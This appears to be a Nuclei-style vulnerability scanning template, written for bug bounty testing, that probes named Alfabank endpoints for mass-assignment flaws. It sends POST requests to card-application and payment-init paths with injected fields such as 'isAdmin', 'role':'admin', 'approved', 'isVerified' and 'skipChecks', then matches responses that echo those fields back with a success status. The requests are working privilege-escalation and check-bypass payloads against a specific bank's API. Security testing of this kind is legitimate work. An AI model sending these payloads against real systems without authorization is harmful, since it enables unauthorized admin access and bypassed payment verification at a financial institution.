id: alfabank-mass-assignment

info:
  name: Alfabank - Mass Assignment Vulnerabilities
  author: bugbounty
  severity: high
  description: Mass assignment with privilege escalation validation
  tags: mass-assignment,alfabank
  reference:
    - https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html

http:
  - raw:
      - |
        POST /cc-short/step1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"card":"visa_classic","isAdmin":true,"role":"admin","approved":true}

      - |
        POST /rest/Init HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"Amount":1000,"OrderId":"{{randstr}}","isVerified":true,"skipChecks":true,"isAdmin":true}

    matchers-condition: and
    matchers:
      - type: word
        part: content_type
        words:
          - "application/json"

      - type: regex
        part: body
        regex:
          - '"(isAdmin|role)"?\s*:\s*(true|"admin")'
          - '"(approved|isVerified)"?\s*:\s*true'
          - '"(skipChecks|bypass)"?\s*:\s*true'
        condition: or

      - type: dsl
        dsl:
          - 'status_code == 200 || status_code == 201'
          - '!contains(tolower(body), "error")'
          - '!contains(tolower(body), "invalid")'
        condition: and

    extractors:
      - type: json
        part: body
        json:
          - '.isAdmin'
          - '.role'
          - '.approved'
